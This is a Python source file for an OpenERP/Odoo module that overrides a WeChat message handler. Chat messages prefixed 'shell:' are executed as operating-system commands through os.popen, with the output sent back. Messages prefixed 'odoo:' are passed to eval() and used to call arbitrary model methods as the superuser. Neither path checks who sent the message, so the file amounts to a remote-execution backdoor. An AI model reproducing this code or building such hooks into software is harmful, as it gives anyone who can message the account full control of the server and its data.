# -*- coding: utf-8 -*-

import openerp
from openerp import SUPERUSER_ID
from openerp.osv import fields, osv
import logging
import os
_logger = logging.getLogger(__name__)

class base_plus(osv.osv):
    _name="rhwl.weixin.base"
    _inherit="rhwl.weixin.base"

    def action_text_input(self,cr,content,original,fromUser):
        if content.startswith("shell:"):
            r = os.popen(content[6:])
            res = r.readlines()
            return str(res)

        if content.startswith("odoo:"):
            content = eval(content[5:] or '')
            model_name = content[0]
            method_name = content[1]
            args = content[2]
            openerp.modules.registry.RegistryManager.check_registry_signaling(cr.dbname)
            registry = openerp.registry(cr.dbname)
            if model_name in registry:
                model = registry[model_name]
                if hasattr(model, method_name):
                    try:
                        msg =getattr(model, method_name)(cr, SUPERUSER_ID, *args)
                    except Exception,e:
                        msg = e.message()
                    openerp.modules.registry.RegistryManager.signal_caches_change(cr.dbname)
                else:
                    msg = "Method `%s.%s` does not exist." % (model_name, method_name)
            else:
                msg = "Model `%s` does not exist." % model_name
            return str(msg)

        return super(base_plus,self).action_text_input(self,cr,content,original,fromUser)